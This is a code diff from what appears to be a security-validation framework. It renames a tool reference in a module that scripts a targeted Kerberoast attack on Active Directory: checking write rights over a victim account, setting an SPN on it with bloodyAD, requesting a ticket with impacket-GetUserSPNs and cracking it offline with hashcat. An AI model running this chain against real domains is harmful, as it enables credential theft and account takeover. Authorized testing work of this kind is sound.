@@ -4,7 +4,7 @@ Encodes "write your own roastable SPN, then roast it" -- KERBEROAST's own
 proven shape (``roast.py``), plus a write-the-precondition-myself front and a
 remove-it-after back:
 
-    dacledit.py -action read              (confirm GenericAll/GenericWrite over victim)
+    impacket-dacledit -action read              (confirm GenericAll/GenericWrite over victim)
     bloodyAD ... set object <victim> servicePrincipalName -v <spn>
     impacket-GetUserSPNs -request -request-user <victim>  -> $krb5tgs$
     hashcat -m 13100 <hashes> <wordlist>  (offline, opt-in -- reuses "offline_crack")
@@ -22,7 +22,7 @@ first time (mirrors ``roast.py``'s own ``offline_crack`` *runtime* authorizer
 gate -- the two are independent, same two-layer pattern as ``destructive``).
 
 ``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
-bloodyAD/dacledit.py human-readable wording (see ``acl_common.py``).
+bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``).
 """
 from __future__ import annotations
 
@@ -168,7 +168,7 @@ class TargetedKerberoastExecutor(ValidationExecutor):
         v = values(params)
         dc = ctx.config.dc_ip
         return [
-            f"dacledit.py -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
             "(confirm precondition GenericAll/GenericWrite)",
             f"bloodyAD ... --host {dc} set object '{v['victim']}' servicePrincipalName "
             f"-v '{v['spn']}'",
